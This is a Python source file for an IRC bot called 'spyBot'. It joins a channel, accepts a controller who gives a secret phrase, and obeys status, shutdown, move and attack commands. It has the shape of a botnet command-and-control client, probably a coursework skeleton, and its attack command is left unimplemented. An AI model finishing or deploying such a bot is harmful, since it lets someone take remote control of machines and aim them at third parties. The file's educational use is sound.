#!/usr/bin/env python
''' bot.py '''

import argparse
import sys
import socket

from errors import ShutdownError
from errors import MoveError

# globals
DEBUG = True
BUFFER_SIZE = 2040

class Bot():
    def __init__(self, hostname, port, channel, secret_phrase):
        # init bot
        self.hostname = hostname
        self.port = port
        self.channel = '#' + channel
        self.secret_phrase = secret_phrase
        self.irc_socket = None
        self.nickname = 'spyBot'
        self.controller = None
        self.controller_nickname = None
    
    def __send_to_channel(self, msg):
        '''
        send message to bot's channel
        format PRIVMSG <#channel> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.channel + ' :' + msg + '\n')
    
    def __send_to_controller(self, msg):
        '''
        send message to specific user
        format PRIVMSG <nickname> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.controller_nickname + ' :' + msg + '\n')

    def __send_message(self, msg):
        '''
        send any message to irc server
        '''
        self.irc_socket.send(msg.encode('utf-8'))

    def __receive_message(self):
        '''
        receives message from IRC server and keeps 
        connection alive by responding to 'PING #' with 'PONG #'
        and finally returns message
        '''
        received_msg = self.irc_socket.recv(BUFFER_SIZE).decode().strip()
        if received_msg.find('PING') != -1:
            self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')

        return received_msg

    def __connect(self):
        '''
        connect to IRC server
        test IRC server:
            162.246.156.17
            12399
        '''
        log('Connecting to: {}:{}, channel: {}'.format(self.hostname, int(self.port), self.channel))
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.irc_socket.connect((self.hostname, self.port))
            except:
                log('Can\'t connect to: {}:{}, channel: {}'.format(self.hostname, int(self.port), self.channel))
            break
        self.__authenticate()
    
    def __authenticate(self):
        self.__send_message('USER ' + self.nickname + ' ' + self.nickname + ' ' + self.nickname + ' :\n')
        self.__send_message('NICK ' + self.nickname + '\n')
        self.__send_message('JOIN ' + self.channel + '\n')

    def __handle_command(self, msg):
        _, cmd = msg.split(' :')
        
        if cmd.startswith('status'):
            try:
                self.__do_status()
            except ValueError as e:
                log('Error: {}'.format(e))
        
        elif cmd.startswith('shutdown'):
            try:
                self.__do_shutdown()
            except ValueError as e:
                log('Error: {}'.format(e))
        
        elif cmd.startswith('attack'):
            try:
                self.__do_attack(cmd)
            except ValueError as e:
                log('Error: {}'.format(e))
        
        elif cmd.startswith('move'):
            try:
                self.__do_move(cmd)
            except ValueError as e:
                log('Error: {}'.format(e))
        
        else:
            raise ValueError('Invalid command!')

    def __verify_controller(self, msg):
        '''
        authenticates the controller using secret_phrase
        format --> :Guest52!889f1007@87.98.219.117 PRIVMSG <#channel> :<msg>
        '''
        sender = msg.split(':')[1].split(' ')[0]
        list = msg.split(' :')
        secret = list[1]
        if self.secret_phrase == secret:
            self.controller = sender
            self.controller_nickname, _ = sender.split('!')
            log('Authenticated controller: ' + self.controller)
            return True
        else:
            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(sender, secret))
            return False

    def __update_controller_nickname(self, msg):
        '''
        update controller nickname
        format --> :Guest52!889f1007@87.98.219.117 NICK Guest522
        '''
        _, new_nickname = msg.split('NICK')
        new_nickname = new_nickname.strip()
        
        old_nickname = self.controller_nickname
        self.controller = self.controller.replace(old_nickname, new_nickname)
        self.controller_nickname = new_nickname
        log('Controller nickname updated from: {} to: {}'.format(old_nickname, new_nickname))

    def __validate_msg(self, msg):
        '''
        format: <sender garbage> :<msg>
        <msg>: secret_phrase command args
        '''
        if (self.controller != None) and (msg.startswith(':' + self.controller)):
            return True

        if not ('PRIVMSG' in msg) or not (self.channel in msg):
            return False

        return True

    def __listen(self):
        '''
        listens for commands from IRC server
        '''
        while True:
            msg = self.__receive_message()
            
            # log(msg)
            if not self.__validate_msg(msg):
                log('Warning: non-cotroller msg')
                continue
            
            if self.controller == None:
                self.__verify_controller(msg)
                continue
            
            if not msg.startswith(':' + self.controller):
                continue

            if 'NICK' in msg:
                self.__update_controller_nickname(msg)
                continue

            log(msg)
            try:
                self.__handle_command(msg)
            except ShutdownError:
                self.irc_socket.close()
                log('Disconnected from server.')
                return
            except ValueError as e:
                log('Error: {}'.format(e))

    def __do_status(self):
        '''
        perform status command
        send this bot's nickname to authenticated controller
        '''
        self.__send_to_controller(self.nickname)
        return
    
    def __do_shutdown(self):
        '''
        perform shutdown command
        terminate bot program
        '''
        log('Shutdown command received, terminating connection.')
        raise ShutdownError()

    def __do_attack(self, cmd):
        '''
        perform attack command
        cmd format --> attack <host-name> <port>
        '''
        raise NotImplementedError()
    
    def __do_move(self, cmd):
        '''
        perform move command
        cmd format --> move <host-name> <port> <channel>
        '''
        try:
            _, host, port, channel = cmd.split(' ')
        except ValueError:
            raise ValueError('Failed to split move.')
        log('Moving to {}:{}, channel {}'.format(host, int(port), channel))
        self.hostname = host
        if self.__validate_port(port):
            self.port = int(port)
        else:
            raise ValueError('Invalid port: {}'.format(port))
        self.channel = '#' + channel
        self.irc_socket.close()
        self.start_bot()

    def __validate_port(self, port):
        return int(port) in range(0, 65536)

    def start_bot(self):
        '''
        start bot
        source: https://stackoverflow.com/questions/2968408
        '''
        self.__connect()
        self.__listen()



def parse_args():
    '''
    Handles parsing arguments
    Reference: https://docs.python.org/3/library/argparse.h
    '''
    usage = 'python3 bot.py <hostname> <port> <channel> <secret-phrase>'
    parser = argparse.ArgumentParser(usage=usage)

    # expected arguments
    parser.add_argument(
        'hostname',
        type=str,
        help='The <hostname> specifies the IRC server\'s hostname.'
    )
    parser.add_argument(
        'port',
        type=int,
        help='The <port> specifies the port for the IRC server\'s hostname'
    )
    parser.add_argument(
        'channel',
        type=str,
        help='The <channel> specifies which IRC channel the bot will join.'
    )
    parser.add_argument(
        'secret_phrase',
        type=str,
        help='The <secret-phrase> specifies some secret text that the IRC bot will listen for.'
    )

    args = parser.parse_args()
    if args.port not in range(0, 65536):
        log('Error: port must be 0-65535.')
        parser.exit('Usage: ' + usage)

    return args

def log(msg):
    ''' Log a debug message '''
    if DEBUG:
        print(msg, file=sys.stderr)

def main():
    args = parse_args()

    # start bot
    bot = Bot(args.hostname, int(args.port), args.channel, args.secret_phrase)
    bot.start_bot()
    

if __name__ == '__main__':
    main()